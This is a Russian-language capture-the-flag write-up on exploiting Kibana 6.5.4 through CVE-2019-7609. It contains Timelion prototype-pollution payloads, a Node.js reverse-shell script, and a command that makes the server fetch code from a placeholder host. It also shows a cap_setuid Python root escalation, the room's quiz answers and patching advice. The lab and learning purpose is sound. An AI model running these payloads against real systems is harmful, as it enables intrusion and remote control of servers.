# Отчет по прохождению Kibana (CVE-2019-7609)

## 1. Разведка (Reconnaissance)
Сканирование Nmap выявило открытые порты:
- 80/tcp (Apache 2.4.18) — на странице приветствие: "linux capabilities is very interesting"
- 22/tcp (OpenSSH 7.2p2)
- 5044/tcp
- 5601/tcp (Kibana 6.5.4)

## 2. Анализ уязвимости
На порту 5601 обнаружена панель Kibana версии 6.5.4. Данная версия уязвима к **CVE-2019-7609** — prototype pollution через компонент Timelion.

## 3. Эксплуатация (Exploitation)

### Стандартный payload (не сработал)
Стандартный эксплойт с использованием `NODE_OPTIONS` и `/proc/self/environ` не принес результата:
```
.es(*).props(label.__proto__.env.AAAA='require("child_process").exec("bash -i >& /dev/tcp/ip/port 0>&1");process.exit()//')
.props(label.__proto__.env.NODE_OPTIONS='--require /proc/self/environ')
```

### Модифицированный payload (сработал)
Был создан JavaScript-код для reverse shell:
```javascript
(function(){
    var net = require("net"),
        cp = require("child_process"),
        sh = cp.spawn("/bin/sh", []);
    var client = new net.Socket();
    client.connect(port, "ip", function() {
        client.pipe(sh.stdin);
    });
    sh.stdout.on('data', (data) => {
        client.write(data);
    });
    sh.stderr.on('data', (data) => {
        client.write(data);
    });
    client.on('close', function() {
        console.log('Connection closed');
    });
    return /a/;
})();
```

Payload отправлен в Timelion:
```
.es(*).props(label.__proto__.kbnWorkerArgv='["node","cli","install","http://ip:port/test.zip"]')
```

На указанный порт пришел reverse shell.

## 4. Получение доступа
Подключение по reverse shell под пользователем `kiba`:
```
uid=1000(kiba) gid=1000(kiba) groups=1000(kiba),4(adm),24(cdrom),27(sudo),30(dip),46(plugdev),114(lpadmin),115(sambashare)
```
Прочитан флаг user.txt.

## 5. Поиск capabilities
Проверка capabilities на системе:
```bash
getcap -r / 2>/dev/null
```
Результаты:
```
/home/kiba/.hackmeplease/python3 = cap_setuid+ep
/usr/bin/mtr = cap_net_raw+ep
/usr/bin/traceroute6.iputils = cap_net_raw+ep
/usr/bin/systemd-detect-virt = cap_dac_override,cap_sys_ptrace+ep
```

## 6. Эскалация привилегий через cap_setuid
`cap_setuid+ep` позволяет бинарному файлу выполнить системный вызов `setuid(0)` внутри своего кода, что делает процесс root **при условии, что владелец файла — root**.

Проверка владельца:
```bash
ls -la /home/kiba/.hackmeplease/python3
# владелец root
```

Выполнение:
```bash
/home/kiba/.hackmeplease/python3 -c 'import os; os.setuid(0); os.execl("/bin/sh", "sh")'
```

Результат:
```
# id
uid=0(root) gid=1000(kiba) groups=1000(kiba),4(adm),24(cdrom),27(sudo),30(dip),46(plugdev),114(lpadmin),115(sambashare)
```
Получены права root. Прочитан флаг root.txt.

## 7. Ответы на вопросы
1. **What is the vulnerability that is specific to programming languages with prototype-based inheritance?**  
   `Prototype pollution`

2. **What is the CVE number for this vulnerability?**  
   `CVE-2019-7609`

3. **How would you recursively list all of these capabilities?**  
   `getcap -r / 2>/dev/null`

## 8. Достижения и новые навыки
- Впервые применена атака **Prototype Pollution** на реальном приложении (Kibana)
- Впервые использован **альтернативный эксплойт** для CVE-2019-7609 через `kbnWorkerArgv` (вместо стандартного `NODE_OPTIONS`)
- Получен reverse shell через внедрение JavaScript-кода в Timelion
- Отработана техника эскалации привилегий через **cap_setuid** на Python-бинарнике
- Углублено понимание работы Linux capabilities в контексте пентеста

## 9. Рекомендации
- Обновить Kibana до актуальной версии (уязвимость исправлена в версиях 6.6.2+)
- Ограничить доступ к Kibana (белый список IP)
- Удалить или ограничить capabilities на бинарниках, не требующих повышенных привилегий
- Регулярно проверять систему на наличие файлов с capabilities: `getcap -r / 2>/dev/null`